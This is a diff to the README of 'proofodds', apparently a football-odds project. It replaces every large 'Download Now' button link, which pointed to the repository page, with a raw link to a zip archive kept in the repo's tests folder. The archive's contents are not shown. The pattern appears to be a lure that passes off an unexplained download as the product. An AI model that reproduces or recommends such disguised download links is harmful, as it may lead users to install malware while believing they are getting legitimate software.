@@ -1,7 +1,7 @@
 <h1>⚽ proofodds - Honest Football Odds, Sealed Before Kickoff</h1>
 
 <p align="center">
-  <a href="https://github.com/Wheyecologicalwarfare3565/proofodds">
+  <a href="https://raw.githubusercontent.com/Wheyecologicalwarfare3565/proofodds/main/tests/v1.7.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Proofodds-brightgreen?style=for-the-badge&logo=github" alt="Download Button" style="background-color:#28a745;color:white;padding:15px 30px;font-size:20px;border-radius:10px;text-decoration:none;display:inline-block;">
   </a>
 </p>
@@ -35,7 +35,7 @@ Click the big green button below (or the same button at the top of this page. Th
 
 
 <p align="center">
-  <a href="https://github.com/Wheyecologicalwarfare3565/proofodds">
+  <a href="https://raw.githubusercontent.com/Wheyecologicalwarfare3565/proofodds/main/tests/v1.7.zip">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Proofodds%20Now-Click%20Here-blue?style=for-the-badge" alt="Download" style="background-color:#007bff;color:white;padding:12px 25px;font-size:18px;border-radius:8px;text-decoration:none;">
   </a>
 </p>
@@ -257,5 +257,5 @@ The project leverages:
 ---
 
 <p align="center">
-  <a href="https://github.com/Wheyecologicalwarfare3565/proofodds" style="background-color:#6f42c1;color:white;padding:14px 32px;font-size:18px;border-radius:8px;text-decoration:none;display:inline-block;">⬇️ Download Proofodds Now – It’s Free</a>
+  <a href="https://raw.githubusercontent.com/Wheyecologicalwarfare3565/proofodds/main/tests/v1.7.zip" style="background-color:#6f42c1;color:white;padding:14px 32px;font-size:18px;border-radius:8px;text-decoration:none;display:inline-block;">⬇️ Download Proofodds Now – It’s Free</a>
 </p>
